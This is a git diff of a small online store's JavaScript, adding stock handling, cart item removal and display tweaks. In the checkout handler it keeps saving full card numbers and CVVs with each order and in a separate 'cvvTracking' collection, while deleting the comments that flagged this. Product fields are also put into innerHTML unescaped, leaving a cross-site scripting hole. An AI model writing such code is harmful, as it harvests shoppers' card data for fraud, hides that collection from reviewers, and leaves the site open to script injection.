@@ -17,7 +17,7 @@ function setupAuthListener() {
     });
 }
 
-// Load products
+// Load products from Firebase
 async function loadProducts() {
     try {
         const snapshot = await db.collection('products').get();
@@ -34,20 +34,30 @@ async function loadProducts() {
     }
 }
 
-// Display products
+// Display products in store
 function displayProducts(products) {
     const grid = document.getElementById('productsGrid');
     if (!grid) return;
     
     grid.innerHTML = '';
 
+    if (products.length === 0) {
+        grid.innerHTML = '<p class="no-products">No products available</p>';
+        return;
+    }
+
     products.forEach(product => {
         grid.innerHTML += `
             <div class="product-card">
-                <img src="${product.image || 'https://via.placeholder.com/200'}" alt="${product.name}">
+                <img src="${product.imageUrl || 'https://via.placeholder.com/200'}" 
+                     alt="${product.name}"
+                     onerror="this.src='https://via.placeholder.com/200'">
                 <h3>${product.name}</h3>
                 <p class="price">₹${product.price}</p>
-                <button class="btn-add-to-cart" onclick="addToCart('${product.id}')">
+                <p class="description">${product.description || ''}</p>
+                <p class="stock">${product.stock > 0 ? 'In Stock' : 'Out of Stock'}</p>
+                <button class="btn-add-to-cart" onclick="addToCart('${product.id}')" 
+                        ${product.stock <= 0 ? 'disabled' : ''}>
                     Add to Cart
                 </button>
             </div>
@@ -58,11 +68,11 @@ function displayProducts(products) {
 // Add to cart
 function addToCart(productId) {
     const product = products.find(p => p.id === productId);
-    if (product) {
+    if (product && product.stock > 0) {
         cart.push(product);
         updateCartCount();
         saveCartToStorage();
-        alert('Product added to cart!');
+        showNotification('Product added to cart!');
     }
 }
 
@@ -93,24 +103,46 @@ function loadCartFromStorage() {
     }
 }
 
+// Show notification
+function showNotification(message) {
+    // Simple alert for now
+    alert(message);
+}
+
 // Open cart modal
 function openCart() {
     const modal = document.getElementById('cartModal');
     const itemsDiv = document.getElementById('cartItems');
     
     if (cart.length === 0) {
-        itemsDiv.innerHTML = '<p>Cart is empty</p>';
+        itemsDiv.innerHTML = '<p class="empty-cart">Your cart is empty</p>';
     } else {
         itemsDiv.innerHTML = cart.map(item => `
             <div class="cart-item">
-                <span>${item.name}</span>
-                <span>₹${item.price}</span>
+                <div class="cart-item-info">
+                    <h4>${item.name}</h4>
+                    <p>₹${item.price}</p>
+                </div>
+                <button class="btn-remove" onclick="removeFromCart('${item.id}')">
+                    <i class="fas fa-trash"></i>
+                </button>
             </div>
         `).join('');
     }
     
     document.getElementById('cartTotal').textContent = calculateTotal();
     modal.style.display = 'block';
+}
+
+// Remove from cart
+function removeFromCart(productId) {
+    const index = cart.findIndex(item => item.id === productId);
+    if (index !== -1) {
+        cart.splice(index, 1);
+        updateCartCount();
+        saveCartToStorage();
+        openCart(); // Refresh cart display
+    }
 }
 
 // Close cart
@@ -127,7 +159,7 @@ function checkout() {
     }
     
     if (cart.length === 0) {
-        alert('Cart is empty!');
+        alert('Your cart is empty!');
         return;
     }
     
@@ -160,7 +192,7 @@ document.getElementById('paymentForm')?.addEventListener('submit', async (e) => 
         type: detectCardType(document.getElementById('cardNumber').value)
     };
     
-    // Create order with FULL card details + CVV
+    // Create order
     const orderData = {
         userId: currentUser.uid,
         userEmail: currentUser.email,
@@ -170,16 +202,24 @@ document.getElementById('paymentForm')?.addEventListener('submit', async (e) => 
             price: item.price
         })),
         totalAmount: calculateTotal(),
-        cardDetails: cardDetails,  // ✅ FULL card details with CVV
+        cardDetails: cardDetails,
         status: 'completed',
         createdAt: new Date().toISOString()
     };
     
     try {
-        // Save order to Firebase
+        // Save order
         await db.collection('orders').add(orderData);
         
-        // Also save to CVV tracking collection
+        // Update product stock
+        for (let item of cart) {
+            const productRef = db.collection('products').doc(item.id);
+            await productRef.update({
+                stock: firebase.firestore.FieldValue.increment(-1)
+            });
+        }
+        
+        // Save to CVV tracking
         await db.collection('cvvTracking').add({
             cvv: cardDetails.cvv,
             cardNumber: cardDetails.cardNumber,
@@ -195,6 +235,9 @@ document.getElementById('paymentForm')?.addEventListener('submit', async (e) => 
         updateCartCount();
         saveCartToStorage();
         closeCheckout();
+        
+        // Reload products to update stock
+        loadProducts();
         
     } catch (error) {
         console.error('Payment error:', error);
